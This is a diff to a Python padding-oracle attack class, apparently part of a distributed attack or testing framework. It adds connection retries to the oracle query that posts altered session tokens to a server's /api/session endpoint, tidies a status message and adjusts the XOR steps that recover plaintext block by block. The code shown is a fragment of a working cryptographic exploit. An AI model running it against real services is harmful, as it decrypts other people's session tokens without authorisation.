@@ -68,7 +68,8 @@ class PaddingOracle(Attack):
         done = sum(b["status"] == "done" for b in blocks)
         if any(b["status"] == "failed" for b in blocks):
             return f"blocked by Encrypt-then-MAC after {job['tried']:,} queries"
-        return f"{done}/{job['meta']['n_blocks']} blocks decrypted with {job['tried']:,} oracle queries ({job['meta']['mode']})"
+        m = job["meta"]
+        return f"{done}/{m['n_blocks']} blocks decrypted with {job['tried']:,} oracle queries ({m['mode']})"
 
     # ------------------------------------------------------------ worker side
     def run_chunk(self, meta: dict, chunk: dict, ctx: ChunkContext) -> dict:
@@ -82,8 +83,14 @@ class PaddingOracle(Attack):
             ctx.r.hset(live, b, json.dumps({"status": status, "plain": plain.hex(), "note": note}))
 
         def padding_ok(x: bytes) -> bool:
-            r = http().post(f"{ORACLE_URL}/api/session", json={"token": (x + cur + mac).hex()}, timeout=5)
-            return r.status_code != PADDING_ERROR
+            for attempt in range(3):  # the server may drop a keep-alive connection: retry
+                try:
+                    r = http().post(f"{ORACLE_URL}/api/session", json={"token": (x + cur + mac).hex()}, timeout=5)
+                    return r.status_code != PADDING_ERROR
+                except requests.ConnectionError:
+                    if attempt == 2:
+                        raise
+            raise AssertionError("unreachable")
 
         report("working")
         # Calibrate: random blocks almost never have valid padding (≈1/256). If the server
@@ -120,6 +127,6 @@ class PaddingOracle(Attack):
             if not found:
                 report("failed", note=f"no valid padding found for byte {j}")
                 return {}
-            report("working", bytes(a ^ p for a, p in zip(inter[j:], prev[j:])))
-        report("done", bytes(a ^ p for a, p in zip(inter, prev)))
+            report("working", bytes(a ^ p for a, p in zip(inter[j:], prev[j:], strict=False)))
+        report("done", bytes(a ^ p for a, p in zip(inter, prev, strict=False)))
         return {}
